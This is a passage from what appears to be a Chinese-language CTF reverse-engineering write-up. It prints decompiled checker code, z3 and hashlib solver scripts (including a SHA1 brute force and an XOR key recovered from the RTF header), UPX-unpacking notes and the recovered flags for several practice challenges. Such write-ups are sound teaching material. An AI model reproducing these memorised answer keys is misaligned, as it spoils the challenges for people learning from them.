<span class="hljs-number">357245568</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">10431000</span> * a1[<span class="hljs-number">3</span>] != <span class="hljs-number">1074393000</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">3977328</span> * a1[<span class="hljs-number">4</span>] != <span class="hljs-number">489211344</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">5138336</span> * a1[<span class="hljs-number">5</span>] != <span class="hljs-number">518971936</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">7532250</span> * a1[<span class="hljs-number">7</span>] != <span class="hljs-number">406741500</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">5551632</span> * a1[<span class="hljs-number">8</span>] != <span class="hljs-number">294236496</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">3409728</span> * a1[<span class="hljs-number">9</span>] != <span class="hljs-number">177305856</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">13013670</span> * a1[<span class="hljs-number">10</span>] != <span class="hljs-number">650683500</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">6088797</span> * a1[<span class="hljs-number">11</span>] != <span class="hljs-number">298351053</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">7884663</span> * a1[<span class="hljs-number">12</span>] != <span class="hljs-number">386348487</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">8944053</span> * a1[<span class="hljs-number">13</span>] != <span class="hljs-number">438258597</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">5198490</span> * a1[<span class="hljs-number">14</span>] != <span class="hljs-number">249527520</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">4544518</span> * a1[<span class="hljs-number">15</span>] != <span class="hljs-number">445362764</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">3645600</span> * a1[<span class="hljs-number">17</span>] != <span class="hljs-number">174988800</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">10115280</span> * a1[<span class="hljs-number">16</span>] != <span class="hljs-number">981182160</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">9667504</span> * a1[<span class="hljs-number">18</span>] != <span class="hljs-number">493042704</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">5364450</span> * a1[<span class="hljs-number">19</span>] != <span class="hljs-number">257493600</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">13464540</span> * a1[<span class="hljs-number">20</span>] != <span class="hljs-number">767478780</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">5488432</span> * a1[<span class="hljs-number">21</span>] != <span class="hljs-number">312840624</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">14479500</span> * a1[<span class="hljs-number">22</span>] != <span class="hljs-number">1404511500</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">6451830</span> * a1[<span class="hljs-number">23</span>] != <span class="hljs-number">316139670</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">6252576</span> * a1[<span class="hljs-number">24</span>] != <span class="hljs-number">619005024</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">7763364</span> * a1[<span class="hljs-number">25</span>] != <span class="hljs-number">372641472</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">7327320</span> * a1[<span class="hljs-number">26</span>] != <span class="hljs-number">373693320</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">8741520</span> * a1[<span class="hljs-number">27</span>] != <span class="hljs-number">498266640</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">8871876</span> * a1[<span class="hljs-number">28</span>] != <span class="hljs-number">452465676</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">4086720</span> * a1[<span class="hljs-number">29</span>] != <span class="hljs-number">208422720</span> )<br>    <span class="hljs-keyword">return</span> 0LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">9374400</span> * a1[<span class="hljs-number">30</span>] == <span class="hljs-number">515592000</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">5759124</span> * a1[<span class="hljs-number">31</span>] == <span class="hljs-number">719890500</span>;<br>  <span class="hljs-keyword">return</span> 0LL;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 少了一个等式，自己遍历一下吧</span><br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>a1 = [Int(<span class="hljs-string">&#x27;v[%d]&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br>s = Solver()<br><br>s.add(<span class="hljs-number">1629056</span> * a1[<span class="hljs-number">0</span>] == <span class="hljs-number">166163712</span> )<br>s.add(<span class="hljs-number">6771600</span> * a1[<span class="hljs-number">1</span>] == <span class="hljs-number">731332800</span> )<br>s.add(<span class="hljs-number">3682944</span> * a1[<span class="hljs-number">2</span>] == <span class="hljs-number">357245568</span> )<br>s.add(<span class="hljs-number">10431000</span> * a1[<span class="hljs-number">3</span>] == <span class="hljs-number">1074393000</span> )<br>s.add(<span class="hljs-number">3977328</span> * a1[<span class="hljs-number">4</span>] == <span class="hljs-number">489211344</span> )<br>s.add(<span class="hljs-number">5138336</span> * a1[<span class="hljs-number">5</span>] == <span class="hljs-number">518971936</span> )<br>s.add(<span class="hljs-number">7532250</span> * a1[<span class="hljs-number">7</span>] == <span class="hljs-number">406741500</span> )<br>s.add(<span class="hljs-number">5551632</span> * a1[<span class="hljs-number">8</span>] == <span class="hljs-number">294236496</span> )<br>s.add(<span class="hljs-number">3409728</span> * a1[<span class="hljs-number">9</span>] == <span class="hljs-number">177305856</span> )<br>s.add(<span class="hljs-number">13013670</span> * a1[<span class="hljs-number">10</span>] == <span class="hljs-number">650683500</span> )<br>s.add(<span class="hljs-number">6088797</span> * a1[<span class="hljs-number">11</span>] == <span class="hljs-number">298351053</span> )<br>s.add(<span class="hljs-number">7884663</span> * a1[<span class="hljs-number">12</span>] == <span class="hljs-number">386348487</span> )<br>s.add(<span class="hljs-number">8944053</span> * a1[<span class="hljs-number">13</span>] == <span class="hljs-number">438258597</span> )<br>s.add(<span class="hljs-number">5198490</span> * a1[<span class="hljs-number">14</span>] == <span class="hljs-number">249527520</span> )<br>s.add(<span class="hljs-number">4544518</span> * a1[<span class="hljs-number">15</span>] == <span class="hljs-number">445362764</span> )<br>s.add(<span class="hljs-number">3645600</span> * a1[<span class="hljs-number">17</span>] == <span class="hljs-number">174988800</span> )<br>s.add(<span class="hljs-number">10115280</span> * a1[<span class="hljs-number">16</span>] == <span class="hljs-number">981182160</span> )<br>s.add(<span class="hljs-number">9667504</span> * a1[<span class="hljs-number">18</span>] == <span class="hljs-number">493042704</span> )<br>s.add(<span class="hljs-number">5364450</span> * a1[<span class="hljs-number">19</span>] == <span class="hljs-number">257493600</span> )<br>s.add(<span class="hljs-number">13464540</span> * a1[<span class="hljs-number">20</span>] == <span class="hljs-number">767478780</span> )<br>s.add(<span class="hljs-number">5488432</span> * a1[<span class="hljs-number">21</span>] == <span class="hljs-number">312840624</span> )<br>s.add(<span class="hljs-number">14479500</span> * a1[<span class="hljs-number">22</span>] == <span class="hljs-number">1404511500</span> )<br>s.add(<span class="hljs-number">6451830</span> * a1[<span class="hljs-number">23</span>] == <span class="hljs-number">316139670</span> )<br>s.add(<span class="hljs-number">6252576</span> * a1[<span class="hljs-number">24</span>] == <span class="hljs-number">619005024</span> )<br>s.add(<span class="hljs-number">7763364</span> * a1[<span class="hljs-number">25</span>] == <span class="hljs-number">372641472</span> )<br>s.add(<span class="hljs-number">7327320</span> * a1[<span class="hljs-number">26</span>] == <span class="hljs-number">373693320</span> )<br>s.add(<span class="hljs-number">8741520</span> * a1[<span class="hljs-number">27</span>] == <span class="hljs-number">498266640</span> )<br>s.add(<span class="hljs-number">8871876</span> * a1[<span class="hljs-number">28</span>] == <span class="hljs-number">452465676</span> )<br>s.add(<span class="hljs-number">4086720</span> * a1[<span class="hljs-number">29</span>] == <span class="hljs-number">208422720</span> )<br>s.add(<span class="hljs-number">9374400</span> * a1[<span class="hljs-number">30</span>] == <span class="hljs-number">515592000</span> )<br>s.add(<span class="hljs-number">5759124</span> * a1[<span class="hljs-number">31</span>] == <span class="hljs-number">719890500</span>)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        <span class="hljs-keyword">try</span>:<br>            ans = <span class="hljs-built_in">chr</span>(m[a1[i]].as_long())<br>            flag += ans<br>        <span class="hljs-keyword">except</span>:<br>            flag += <span class="hljs-string">&#x27;?&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#flag&#123;e?65421110ba03099a1c039337&#125;</span><br></code></pre></td></tr></table></figure><h1 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h1><blockquote><p>考点</p><ul><li>API算法</li><li>hash爆破</li><li>rtf文件格式</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)<br>&#123;<br>  DWORD i; // [esp+4Ch] [ebp-28h]<br>  CHAR String2[<span class="hljs-number">4</span>]; // [esp+50h] [ebp-24h] BYREF<br>  BYTE pbData_1[<span class="hljs-number">20</span>]; // [esp+54h] [ebp-20h] BYREF<br>  DWORD pdwDataLen; // [esp+68h] [ebp-Ch] BYREF<br>  HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] BYREF<br>  HCRYPTPROV phProv; // [esp+70h] [ebp-4h] BYREF<br><br>  // ;<span class="hljs-number">0xf0000000</span> -&gt; CRYPT_VERIFYCONTEXT<br>  <span class="hljs-keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, 1u, <span class="hljs-number">0xF0000000</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( CryptCreateHash(phProv, CALG_SHA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;phHash) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="hljs-number">0</span>) )<br>    &#123;<br>      CryptGetHashParam(phHash, HP_HASHVAL, pbData_1, &amp;pdwDataLen, <span class="hljs-number">0</span>);<br>      *lpString1 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; pdwDataLen; ++i )<br>      &#123;<br>        wsprintfA(String2, <span class="hljs-string">&quot;%02X&quot;</span>, pbData_1[i]);<br>        lstrcatA(lpString1, String2);<br>      &#125;<br>      CryptDestroyHash(phHash);<br>      CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      CryptDestroyHash(phHash);<br>      CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl sub_401040(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)<br>&#123;<br>  DWORD i; // [esp+4Ch] [ebp-24h]<br>  CHAR String2[<span class="hljs-number">4</span>]; // [esp+50h] [ebp-20h] BYREF<br>  BYTE pbData_1[<span class="hljs-number">16</span>]; // [esp+54h] [ebp-1Ch] BYREF<br>  DWORD pdwDataLen; // [esp+64h] [ebp-Ch] BYREF<br>  HCRYPTHASH phHash; // [esp+68h] [ebp-8h] BYREF<br>  HCRYPTPROV phProv; // [esp+6Ch] [ebp-4h] BYREF<br><br>  // ;<span class="hljs-number">0xf0000000</span> -&gt; CRYPT_VERIFYCONTEXT<br>  <span class="hljs-keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, 1u, <span class="hljs-number">0xF0000000</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( CryptCreateHash(phProv, CALG_MD5, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;phHash) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="hljs-number">0</span>) )<br>    &#123;<br>      CryptGetHashParam(phHash, HP_HASHVAL, pbData_1, &amp;pdwDataLen, <span class="hljs-number">0</span>);<br>      *lpString1 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; pdwDataLen; ++i )<br>      &#123;<br>        wsprintfA(String2, <span class="hljs-string">&quot;%02X&quot;</span>, pbData_1[i]);<br>        lstrcatA(lpString1, String2);<br>      &#125;<br>      CryptDestroyHash(phHash);<br>      CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      CryptDestroyHash(phHash);<br>      CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl main_0(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  size_t dwDataLen; // eax<br>  size_t dwDataLen_1; // eax<br>  char Destination_1[<span class="hljs-number">260</span>]; // [esp+4Ch] [ebp-<span class="hljs-number">3</span>10h] BYREF<br>  <span class="hljs-built_in">int</span> n100000; // [esp+150h] [ebp-20Ch]<br>  char String1[<span class="hljs-number">260</span>]; // [esp+154h] [ebp-208h] BYREF<br>  char Destination[<span class="hljs-number">260</span>]; // [esp+258h] [ebp-104h] BYREF<br><br>  memset(Destination, <span class="hljs-number">0</span>, sizeof(Destination));<br>  memset(String1, <span class="hljs-number">0</span>, sizeof(String1));<br>  n100000 = <span class="hljs-number">0</span>;<br>  printf(<span class="hljs-string">&quot;pls input the first passwd(1): &quot;</span>);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, Destination);<br>  <span class="hljs-keyword">if</span> ( strlen(Destination) != <span class="hljs-number">6</span> )<br>  &#123;<br>    printf(<span class="hljs-string">&quot;Must be 6 characters!\n&quot;</span>);<br>    ExitProcess(<span class="hljs-number">0</span>);<br>  &#125;<br>  n100000 = atoi(Destination);<br>  <span class="hljs-keyword">if</span> ( n100000 &lt; <span class="hljs-number">100000</span> )<br>    ExitProcess(<span class="hljs-number">0</span>);<br>  strcat(Destination, <span class="hljs-string">&quot;@DBApp&quot;</span>);<br>  dwDataLen = strlen(Destination);<br>  sub_40100A((BYTE *)Destination, dwDataLen, String1);<br>  <span class="hljs-keyword">if</span> ( !_strcmpi(String1, <span class="hljs-string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) )<br>  &#123;<br>    printf(<span class="hljs-string">&quot;continue...\n\n&quot;</span>);<br>    printf(<span class="hljs-string">&quot;pls input the first passwd(2): &quot;</span>);<br>    memset(Destination_1, <span class="hljs-number">0</span>, sizeof(Destination_1));<br>    scanf(<span class="hljs-string">&quot;%s&quot;</span>, Destination_1);<br>    <span class="hljs-keyword">if</span> ( strlen(Destination_1) != <span class="hljs-number">6</span> )<br>    &#123;<br>      printf(<span class="hljs-string">&quot;Must be 6 characters!\n&quot;</span>);<br>      ExitProcess(<span class="hljs-number">0</span>);<br>    &#125;<br>    strcat(Destination_1, Destination);<br>    memset(String1, <span class="hljs-number">0</span>, sizeof(String1));<br>    dwDataLen_1 = strlen(Destination_1);<br>    sub_401019((BYTE *)Destination_1, dwDataLen_1, String1);<br>    <span class="hljs-keyword">if</span> ( !_strcmpi(<span class="hljs-string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, String1) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !(unsigned __int8)sub_40100F(Destination_1) )<br>      &#123;<br>        printf(<span class="hljs-string">&quot;Error!!\n&quot;</span>);<br>        ExitProcess(<span class="hljs-number">0</span>);<br>      &#125;<br>      printf(<span class="hljs-string">&quot;bye ~~\n&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 难点</span><br><span class="hljs-comment">## 1.识别算法，利用API（CryptCreateHash）来实现hash算法</span><br><span class="hljs-comment">## 2.对pwd的解密，这里有两个思路，比较巧妙的就是利用rtf的magic头来还原；第二直接解密md5（可以直接解密的）</span><br><span class="hljs-keyword">import</span> hashlib<br><br>tmp = <span class="hljs-string">&#x27;@DBApp&#x27;</span><br>hash_ans = <span class="hljs-string">&#x27;6E32D0943418C2C33385BC35A1470250DD8923A9&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>,<span class="hljs-number">1000000</span>):<br>    ans = <span class="hljs-built_in">str</span>(i) + tmp<br>    <span class="hljs-keyword">if</span> hashlib.sha1(ans.encode()).hexdigest().upper() == hash_ans:<br>        <span class="hljs-built_in">print</span>(i)<br>        tmp = ans<br>        <span class="hljs-keyword">break</span><br><br>rtf = <span class="hljs-string">b&#x27;&#123;\\rtf1&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">fr&quot;C:\Users\Admin\Downloads\AAA101.bin&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rtf)):<br>    key.append(rtf[i] ^ data[i])<br>pwd = <span class="hljs-built_in">bytes</span>(key).decode() + tmp<br><br>data = <span class="hljs-built_in">list</span>(data)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    data[i] ^= <span class="hljs-built_in">ord</span>(pwd[i%<span class="hljs-built_in">len</span>(pwd)])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(data).decode())<br><span class="hljs-comment"># flag&#123;N0_M0re_Free_Bugs&#125;</span><br></code></pre></td></tr></table></figure><h1 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h1><blockquote><p>考点</p><ul><li>upx脱壳</li><li>二进制工具使用</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">.text:0804887C ; __unwind &#123;<br>.text:0804887C                 lea     ecx, [esp+<span class="hljs-number">4</span>]<br>.text:08048880                 <span class="hljs-keyword">and</span>     esp, 0FFFFFFF0h<br>.text:08048883                 push    dword ptr [ecx-<span class="hljs-number">4</span>]<br>.text:08048886                 push    ebp<br>.text:08048887                 mov     ebp, esp<br>.text:08048889                 push    ecx<br>.text:0804888A                 sub     esp, 14h<br>.text:0804888D                 mov     [ebp+var_C], offset flag ; <span class="hljs-string">&quot;wctf2020&#123;Just_upx_-d&#125;&quot;</span><br>.text:08048894                 sub     esp, 0Ch<br>.text:08048897                 push    offset aWhereIsIt ; <span class="hljs-string">&quot;where is it?&quot;</span><br>.text:0804889C                 call    puts<br>.text:080488A1                 add     esp, 10h<br>.text:080488A4                 mov     eax, <span class="hljs-number">0</span><br>.text:080488A9                 mov     ecx, [ebp+var_4]<br>.text:080488AC                 leave<br>.text:080488AD                 lea     esp, [ecx-<span class="hljs-number">4</span>]<br>.text:080488B0                 retn<br>.text:080488B0 ; &#125; // starts at 804887C<br>.text:080488B0 main            endp<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>flag&#123;Just_upx_-d&#125;<br></code></pre></td></tr></table></figure><h1 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a><font style="color:rgb(33, 37, 41);">[MRCTF2020]Transform</font></h1><blockquote><p>考点</p><ul><li>排序</li><li>xor</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char Str[<span class="hljs-number">104</span>]; // [rsp+20h] [rbp-70h] BYREF<br>  <span class="hljs-built_in">int</span> j; // [rsp+88h] [rbp-8h]<br>  <span class="hljs-built_in">int</span> i; // [rsp+8Ch] [rbp-4h]<br><br>  sub_402230(argc, argv, envp);<br>  sub_40E640(<span class="hljs-string">&quot;Give me your code:\n&quot;</span>);<br>  sub_40E5F0(<span class="hljs-string">&quot;%s&quot;</span>, Str);<br>  <span class="hljs-keyword">if</span> ( strlen(Str) != <span class="hljs-number">33</span> )<br>  &#123;<br>    sub_40E640(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    exit(<span 